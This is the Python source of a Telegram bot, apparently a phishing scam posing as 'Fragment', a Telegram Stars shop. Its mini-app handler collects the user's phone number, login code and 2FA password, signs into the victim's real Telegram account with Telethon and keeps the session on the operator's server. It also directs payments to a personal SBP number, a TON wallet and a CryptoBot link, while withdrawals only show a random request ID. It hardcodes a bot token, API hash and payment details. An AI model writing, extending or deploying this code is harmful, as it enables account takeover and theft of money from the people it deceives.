import asyncio
import logging
import random
import sqlite3
import secrets
import os
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command, CommandStart
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo,
    InlineQuery, InlineQueryResultArticle, InputTextMessageContent
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from telethon import TelegramClient
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneNumberInvalidError,
    FloodWaitError
)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN   = "7511789367:AAGVIDu27Sb5ZwJUjQRiHOJ-CZinbRUFrDQ"
ADMIN_ID    = 174415647

# ========== API ДАННЫЕ ДЛЯ TELEGRAM ==========
API_ID      = 28687552
API_HASH    = "1abf9a58d0c22f62437bec89bd6b27a3"

# ========== ПЕРЕМЕННЫЕ МАГАЗИНА ==========
SBP_PHONE   = "89041751408"
SBP_BANK    = "ВТБ — Александр Ф."
TON_ADDRESS = "UQDGN5pfjPxorFyjN2xha84bapuADDtPcRofNDJ4dK2YXxZd"
CRYPTO_BOT  = "https://t.me/send?start=IVbfPL7Tk4XA"

SHOP_STAR_PRICE_RUB = 1.1
SHOP_MIN_STARS      = 50
TOTAL_STARS_BOUGHT  = 6_385_921
STAR_TO_USD         = 0.013
TOTAL_USD           = round(TOTAL_STARS_BOUGHT * STAR_TO_USD)

bot     = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp      = Dispatcher(storage=storage)

# ========== КАСТОМНЫЕ ПРЕМИУМ ЭМОДЗИ ==========
def e(doc_id: str) -> str:
    return f'<tg-emoji emoji-id="{doc_id}"></tg-emoji>'

EMOJI = {
    "user":       e("5199552030615558774"),
    "star":       e("5267500801240092311"),
    "shield":     e("5197434882321567830"),
    "gift":       e("5197369495739455200"),
    "lock":       e("5197161121106123533"),
    "money":      e("5278467510604160626"),
    "diamond":    e("5264713049637409446"),
    "card":       e("5445353829304387411"),
    "rocket":     e("5444856076954520455"),
    "fire":       e("5303138782004924588"),
    "bell":       e("5312361253610475399"),
    "trophy":     e("5332455502917949981"),
    "check":      e("5274055917766202507"),
    "gem":        e("5258203794772085854"),
    "clock":      e("5429651785352501917"),
    "crystal":    e("5195033767969839232"),
    "chart":      e("5382194935057372936"),
    "spark":      e("5902449142575141204"),
    "warning":    e("5447644880824181073"),
    "wallet":     e("5893382531037794941"),
    "bank":       e("5238132025323444613"),
    "banknote":   e("5201873447554145566"),
    "link":       e("5902449142575141204"),
    "shine":      e("5235630047959727475"),
    "tonkeeper":  e("5397829221605191505"),
    "top_medal":  e("5188344996356448758"),
    "stars_deal": e("5321485469249198987"),
    "security":   e("5197288647275071607"),
    "stats":      e("5028746137645876535"),
    "requisites": e("5242631901214171852"),
    "cryptobot":  e("5242606681166220600"),
    "welcome":    e("5251340119205501791"),
    "balance":    e("5424976816530014958"),
    "pencil":     e("5197371802136892976"),
    "safe":       e("5262517101578443800"),
    "medal":      e("5463289097336405244"),
    "handshake":  e("5287231198098117669"),
    "pin":        e("5893297890117292323"),
    "target":     e("5893081007153746175"),
    "num1":       e("5794164805065514131"),
    "num2":       e("5794085322400733645"),
    "num3":       e("5794280000383358988"),
    "num4":       e("5794241397217304511"),
    "store":      e("4988289890769699938"),
    "photo":      e("5197521015321808897"),
    "hourglass":  e("5197453929637381812"),
    "back":       e("5197371802136892976"),
}

# ========== БАЗА ДАННЫХ ==========
def init_db():
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            phone TEXT,
            is_authorized BOOLEAN DEFAULT 0,
            stars_balance INTEGER DEFAULT 0,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS auth_sessions (
            user_id INTEGER PRIMARY KEY,
            phone TEXT,
            step TEXT,
            session_expires TIMESTAMP,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()

init_db()
os.makedirs("sessions", exist_ok=True)

# ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
def save_auth_session(user_id: int, phone: str, step: str = "phone"):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    expires = datetime.now() + timedelta(minutes=30)
    cursor.execute('INSERT OR REPLACE INTO auth_sessions (user_id, phone, step, session_expires) VALUES (?, ?, ?, ?)',
                   (user_id, phone, step, expires))
    conn.commit()
    conn.close()

def get_auth_session(user_id: int):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('SELECT phone, step, session_expires FROM auth_sessions WHERE user_id = ?', (user_id,))
    row = cursor.fetchone()
    conn.close()
    if row and datetime.fromisoformat(row[2]) > datetime.now():
        return {"phone": row[0], "step": row[1]}
    return None

def clear_auth_session(user_id: int):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('DELETE FROM auth_sessions WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

def authorize_user(user_id: int, phone: str):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('INSERT OR REPLACE INTO users (user_id, phone, is_authorized) VALUES (?, ?, 1)', (user_id, phone))
    conn.commit()
    conn.close()

def get_user_balance(user_id: int) -> int:
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('SELECT stars_balance FROM users WHERE user_id = ?', (user_id,))
    row = cursor.fetchone()
    conn.close()
    return row[0] if row else 0

user_clients = {}

# ========== КЛАВИАТУРЫ (только текст, без эмодзи в кнопках) ==========
def main_menu_keyboard():
    buttons = [
        [
            InlineKeyboardButton(text="👤 Профиль", callback_data="profile"),
            InlineKeyboardButton(text="💰 Баланс", callback_data="balance")
        ],
        [
            InlineKeyboardButton(text="⭐ Купить звёзды", callback_data="buy"),
            InlineKeyboardButton(text="💸 Вывести", callback_data="withdraw_menu")
        ],
        [
            InlineKeyboardButton(text="📋 Реквизиты", callback_data="requisites"),
            InlineKeyboardButton(text="📞 Поддержка", callback_data="support")
        ],
        [
            InlineKeyboardButton(text="🚀 Открыть Mini App", web_app=WebAppInfo(url="https://stars-zdgz.onrender.com"))
        ]
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def buy_keyboard():
    buttons = [
        [
            InlineKeyboardButton(text="⭐ 100 звёзд", callback_data="buy_100"),
            InlineKeyboardButton(text="⭐ 500 звёзд", callback_data="buy_500")
        ],
        [
            InlineKeyboardButton(text="⭐ 1 000 звёзд", callback_data="buy_1000"),
            InlineKeyboardButton(text="⭐ 2 500 звёзд", callback_data="buy_2500")
        ],
        [
            InlineKeyboardButton(text="✏️ Другая сумма", callback_data="buy_custom")
        ],
        [
            InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")
        ]
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def withdraw_keyboard():
    buttons = [
        [
            InlineKeyboardButton(text="⭐ 100 звёзд", callback_data="withdraw_100"),
            InlineKeyboardButton(text="⭐ 500 звёзд", callback_data="withdraw_500")
        ],
        [
            InlineKeyboardButton(text="⭐ 1 000 звёзд", callback_data="withdraw_1000"),
            InlineKeyboardButton(text="⭐ 2 500 звёзд", callback_data="withdraw_2500")
        ],
        [
            InlineKeyboardButton(text="✏️ Другая сумма", callback_data="withdraw_custom")
        ],
        [
            InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")
        ]
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)

# ========== КОМАНДЫ БОТА ==========
@dp.message(CommandStart())
async def cmd_start(message: Message):
    await message.answer(
        f"{EMOJI['crystal']} <b>Fragment</b> — управляйте звёздами Telegram {EMOJI['crystal']}\n\n"
        f"{EMOJI['rocket']} Нажмите кнопку ниже, чтобы открыть мини-приложение {EMOJI['rocket']}\n\n"
        f"{EMOJI['shield']} <i>Авторизация через Telegram — безопасно и быстро</i> {EMOJI['shield']}\n\n"
        f"{EMOJI['star']} <b>1 звезда = 0.013 USD</b> {EMOJI['star']}\n"
        f"{EMOJI['diamond']} <b>Всего выпущено: {TOTAL_STARS_BOUGHT:,} ⭐</b> {EMOJI['diamond']}",
        reply_markup=main_menu_keyboard(),
        parse_mode="HTML"
    )

@dp.message(Command("admin"))
async def cmd_admin(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer(f"{EMOJI['warning']} Нет доступа {EMOJI['warning']}", parse_mode="HTML")
        return

    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM users WHERE is_authorized = 1")
    authorized = cursor.fetchone()[0]
    cursor.execute("SELECT COUNT(*) FROM users")
    total = cursor.fetchone()[0]
    conn.close()

    await message.answer(
        f"{EMOJI['chart']} <b>СТАТИСТИКА FRAGMENT</b> {EMOJI['chart']}\n\n"
        f"👥 Всего пользователей: <code>{total}</code>\n"
        f"✅ Авторизовано: <code>{authorized}</code>\n"
        f"⭐ Всего звёзд: <code>{TOTAL_STARS_BOUGHT:,}</code>\n"
        f"💰 Общая сумма: <code>${TOTAL_USD:,} USD</code>\n"
        f"💎 Курс: <code>1 ⭐ = ${STAR_TO_USD}</code>",
        parse_mode="HTML"
    )

# ========== CALLBACK HANDLERS ==========
@dp.callback_query()
async def handle_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    data = callback.data

    if data == "profile":
        conn = sqlite3.connect('users.db')
        cursor = conn.cursor()
        cursor.execute('SELECT phone, is_authorized FROM users WHERE user_id = ?', (user_id,))
        row = cursor.fetchone()
        conn.close()

        if row and row[1]:
            await callback.message.edit_text(
                f"{EMOJI['user']} <b>👤 ПРОФИЛЬ</b> {EMOJI['user']}\n\n"
                f"📱 Телефон: <code>{row[0]}</code>\n"
                f"🆔 Telegram ID: <code>{user_id}</code>\n"
                f"👤 Имя: {callback.from_user.full_name}\n"
                f"🔹 Username: @{callback.from_user.username or 'нет'}\n\n"
                f"{EMOJI['safe']} 🔒 Ваши данные защищены",
                parse_mode="HTML",
                reply_markup=main_menu_keyboard()
            )
        else:
            await callback.message.edit_text(
                f"{EMOJI['warning']} ⚠️ Вы не авторизованы\n\nНажмите кнопку «Открыть Mini App» и войдите в аккаунт.",
                parse_mode="HTML",
                reply_markup=main_menu_keyboard()
            )

    elif data == "balance":
        balance = get_user_balance(user_id)
        await callback.message.edit_text(
            f"{EMOJI['balance']} <b>💰 БАЛАНС</b> {EMOJI['balance']}\n\n"
            f"⭐ Звёзды: <code>{balance} ⭐</code>\n"
            f"💵 В USD: <code>${balance * STAR_TO_USD:.2f}</code>\n"
            f"💶 В RUB: <code>{balance * SHOP_STAR_PRICE_RUB:.2f} ₽</code>\n\n"
            f"Курс: 1 ⭐ = ${STAR_TO_USD} / {SHOP_STAR_PRICE_RUB} ₽",
            parse_mode="HTML",
            reply_markup=main_menu_keyboard()
        )

    elif data == "buy":
        await callback.message.edit_text(
            f"{EMOJI['store']} <b>🛒 ПОКУПКА ЗВЁЗД</b> {EMOJI['store']}\n\n"
            f"Выберите количество:\n\n"
            f"⭐ 100 звёзд = ${100 * STAR_TO_USD:.2f} / {100 * SHOP_STAR_PRICE_RUB:.0f} ₽\n"
            f"⭐ 500 звёзд = ${500 * STAR_TO_USD:.2f} / {500 * SHOP_STAR_PRICE_RUB:.0f} ₽\n"
            f"⭐ 1 000 звёзд = ${1000 * STAR_TO_USD:.2f} / {1000 * SHOP_STAR_PRICE_RUB:.0f} ₽\n"
            f"⭐ 2 500 звёзд = ${2500 * STAR_TO_USD:.2f} / {2500 * SHOP_STAR_PRICE_RUB:.0f} ₽",
            parse_mode="HTML",
            reply_markup=buy_keyboard()
        )

    elif data == "withdraw_menu":
        await callback.message.edit_text(
            f"{EMOJI['money']} <b>💸 ВЫВОД ЗВЁЗД</b> {EMOJI['money']}\n\n"
            f"Выберите количество:\n\n"
            f"⭐ 100 звёзд = ${100 * STAR_TO_USD:.2f}\n"
            f"⭐ 500 звёзд = ${500 * STAR_TO_USD:.2f}\n"
            f"⭐ 1 000 звёзд = ${1000 * STAR_TO_USD:.2f}\n"
            f"⭐ 2 500 звёзд = ${2500 * STAR_TO_USD:.2f}\n\n"
            f"⏱️ Вывод занимает до 10 минут",
            parse_mode="HTML",
            reply_markup=withdraw_keyboard()
        )

    elif data == "requisites":
        await callback.message.edit_text(
            f"{EMOJI['requisites']} <b>📋 РЕКВИЗИТЫ ДЛЯ ОПЛАТЫ</b> {EMOJI['requisites']}\n\n"
            f"🏦 <b>СБП:</b> <code>{SBP_PHONE}</code> ({SBP_BANK})\n"
            f"{EMOJI['tonkeeper']} 💎 <b>TON:</b> <code>{TON_ADDRESS}</code>\n"
            f"{EMOJI['cryptobot']} 🤖 <b>CryptoBot:</b> <a href='{CRYPTO_BOT}'>Нажмите для оплаты</a>\n\n"
            f"<b>Важно!</b> В назначении платежа укажите ваш ID: <code>{user_id}</code>",
            parse_mode="HTML",
            disable_web_page_preview=True,
            reply_markup=main_menu_keyboard()
        )

    elif data == "support":
        await callback.message.edit_text(
            f"{EMOJI['handshake']} <b>📞 ПОДДЕРЖКА</b> {EMOJI['handshake']}\n\n"
            f"👤 Администратор: @DarkStudiox_admin\n"
            f"📢 Новости: @DarkStudiox_news\n"
            f"💬 Чат: @DarkStudiox_chat",
            parse_mode="HTML",
            reply_markup=main_menu_keyboard()
        )

    elif data == "back_to_main":
        await callback.message.edit_text(
            f"{EMOJI['crystal']} <b>Fragment</b> — управляйте звёздами Telegram {EMOJI['crystal']}\n\n"
            f"{EMOJI['rocket']} Нажмите кнопку ниже, чтобы открыть мини-приложение {EMOJI['rocket']}\n\n"
            f"{EMOJI['shield']} <i>Авторизация через Telegram — безопасно и быстро</i> {EMOJI['shield']}\n\n"
            f"{EMOJI['star']} <b>1 звезда = 0.013 USD</b> {EMOJI['star']}\n"
            f"{EMOJI['diamond']} <b>Всего выпущено: {TOTAL_STARS_BOUGHT:,} ⭐</b> {EMOJI['diamond']}",
            parse_mode="HTML",
            reply_markup=main_menu_keyboard()
        )

    elif data.startswith("buy_"):
        amount = int(data.split("_")[1])
        await callback.message.edit_text(
            f"{EMOJI['requisites']} <b>📋 ОПЛАТА {amount} ⭐</b> {EMOJI['requisites']}\n\n"
            f"⭐ Сумма: {amount} ⭐\n"
            f"💵 К оплате: ${amount * STAR_TO_USD:.2f} / {amount * SHOP_STAR_PRICE_RUB:.0f} ₽\n\n"
            f"🏦 <b>СБП:</b> <code>{SBP_PHONE}</code> ({SBP_BANK})\n"
            f"{EMOJI['tonkeeper']} 💎 <b>TON:</b> <code>{TON_ADDRESS[:20]}...</code>\n"
            f"{EMOJI['cryptobot']} 🤖 <b>CryptoBot:</b> <a href='{CRYPTO_BOT}'>Перейти</a>\n\n"
            f"<b>Важно!</b> В назначении платежа укажите: <code>⭐{amount} ID:{user_id}</code>",
            parse_mode="HTML",
            disable_web_page_preview=True,
            reply_markup=main_menu_keyboard()
        )

    elif data.startswith("withdraw_"):
        amount = int(data.split("_")[1])
        balance = get_user_balance(user_id)
        if balance < amount:
            await callback.answer(f"Недостаточно звёзд! У вас {balance} ⭐", show_alert=True)
            return

        await callback.message.edit_text(
            f"{EMOJI['money']} <b>💰 ЗАЯВКА НА ВЫВОД {amount} ⭐</b> {EMOJI['money']}\n\n"
            f"⭐ Сумма: {amount} ⭐\n"
            f"💵 В USD: ${amount * STAR_TO_USD:.2f}\n\n"
            f"⏱️ Статус: <i>обрабатывается</i>\n"
            f"🆔 ID заявки: <code>{secrets.token_hex(8)}</code>",
            parse_mode="HTML",
            reply_markup=main_menu_keyboard()
        )

    elif data in ["buy_custom", "withdraw_custom"]:
        await callback.message.edit_text(
            f"{EMOJI['pencil']} <b>✏️ Введите сумму</b> {EMOJI['pencil']}\n\n"
            f"Отправьте сообщением количество звёзд.\n"
            f"Минимальная сумма: <b>{SHOP_MIN_STARS} ⭐</b>",
            parse_mode="HTML",
            reply_markup=main_menu_keyboard()
        )

    await callback.answer()

# ========== ОБРАБОТКА WEBAПП (ОТПРАВКА И ПРОВЕРКА КОДА) ==========
@dp.message(F.web_app_data)
async def handle_webapp_data(message: Message):
    data = message.web_app_data.data
    user_id = message.from_user.id

    logger.info(f"📩 Получены данные от {user_id}: {data[:100]}...")

    try:
        import json
        payload = json.loads(data)
        action = payload.get("action")

        # ========== 1. ОТПРАВКА КОДА ==========
        if action == "send_code":
            phone = payload.get("phone")
            if not phone:
                await message.answer("❌ Не указан номер телефона")
                return

            # Очищаем номер от пробелов и скобок
            clean_phone = phone.replace(" ", "").replace("(", "").replace(")", "").replace("-", "")
            if not clean_phone.startswith("+"):
                clean_phone = "+" + clean_phone

            save_auth_session(user_id, clean_phone, "code")
            await message.answer(f"📱 Отправляю код на номер {clean_phone}...")

            try:
                client = TelegramClient(f"sessions/user_{user_id}", API_ID, API_HASH)
                await client.connect()

                if not client.is_connected():
                    await message.answer("❌ Не удалось подключиться к Telegram API")
                    return

                await client.send_code_request(clean_phone)
                user_clients[user_id] = client

                await message.answer(
                    f"✅ <b>Код отправлен на {clean_phone}</b>\n\n"
                    f"🔐 Введите код из Telegram в мини-приложении (5 цифр)\n"
                    f"⏱️ Код действителен 5 минут\n\n"
                    f"📩 Проверьте личные сообщения от Telegram!",
                    parse_mode="HTML"
                )
            except PhoneNumberInvalidError:
                await message.answer("❌ Неверный формат номера телефона")
                clear_auth_session(user_id)
            except FloodWaitError as e:
                await message.answer(f"⚠️ Слишком много попыток. Подождите {e.seconds} секунд.")
                clear_auth_session(user_id)
            except Exception as e:
                logger.error(f"Ошибка отправки кода: {e}")
                await message.answer(f"❌ Ошибка: {str(e)}")
                clear_auth_session(user_id)

        # ========== 2. ПРОВЕРКА КОДА ==========
        elif action == "check_code":
            code = payload.get("code")
            session = get_auth_session(user_id)

            if not session or session["step"] != "code":
                await message.answer("❌ Сессия истекла. Начните заново.")
                return

            client = user_clients.get(user_id)
            if not client:
                await message.answer("❌ Сессия не найдена. Начните заново.")
                clear_auth_session(user_id)
                return

            try:
                # Пробуем войти с кодом
                await client.sign_in(session["phone"], code)
                me = await client.get_me()

                await message.answer(
                    f"✅ <b>АВТОРИЗАЦИЯ УСПЕШНА!</b>\n\n"
                    f"👤 Вы вошли в аккаунт: <b>{me.first_name} {me.last_name or ''}</b>\n"
                    f"📱 Номер: <code>{me.phone}</code>\n"
                    f"🔹 Username: @{me.username or 'нет'}\n\n"
                    f"✨ Добро пожаловать в Fragment!\n"
                    f"🔒 Сессия сохранена",
                    parse_mode="HTML"
                )
                authorize_user(user_id, session["phone"])
                clear_auth_session(user_id)

            except SessionPasswordNeededError:
                # Требуется 2FA
                save_auth_session(user_id, session["phone"], "2fa")
                await message.answer(
                    f"🔐 <b>ТРЕБУЕТСЯ ПАРОЛЬ 2FA</b>\n\n"
                    f"У вас включена двухэтапная аутентификация.\n"
                    f"Введите пароль в мини-приложении.",
                    parse_mode="HTML"
                )

            except PhoneCodeInvalidError:
                await message.answer("❌ Неверный код. Попробуйте ещё раз.")

            except Exception as e:
                logger.error(f"Ошибка проверки кода: {e}")
                await message.answer(f"❌ Ошибка: {str(e)}")

        # ========== 3. ПРОВЕРКА 2FA ==========
        elif action == "check_2fa":
            password = payload.get("password")
            session = get_auth_session(user_id)

            if not session or session["step"] != "2fa":
                await message.answer("❌ Сессия истекла. Начните заново.")
                return

            client = user_clients.get(user_id)
            if not client:
                await message.answer("❌ Сессия не найдена. Начните заново.")
                clear_auth_session(user_id)
                return

            try:
                await client.sign_in(password=password)
                me = await client.get_me()

                await message.answer(
                    f"✅ <b>АВТОРИЗАЦИЯ УСПЕШНА!</b>\n\n"
                    f"👤 Вы вошли в аккаунт: <b>{me.first_name} {me.last_name or ''}</b>\n"
                    f"📱 Номер: <code>{me.phone}</code>\n"
                    f"🔹 Username: @{me.username or 'нет'}\n\n"
                    f"✨ Добро пожаловать в Fragment!\n"
                    f"🔒 Сессия сохранена",
                    parse_mode="HTML"
                )
                authorize_user(user_id, session["phone"])
                clear_auth_session(user_id)

            except Exception as e:
                logger.error(f"Ошибка 2FA: {e}")
                await message.answer(f"❌ Неверный пароль 2FA: {str(e)}")

    except Exception as e:
        logger.error(f"Ошибка обработки: {e}")
        await message.answer(f"❌ Ошибка: {str(e)}")

# ========== ЗАПУСК ==========
async def main():
    await bot.delete_webhook(drop_pending_updates=True)
    logger.info("🌟 Бот Fragment запущен")
    logger.info("🚀 Telethon авторизация активна")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
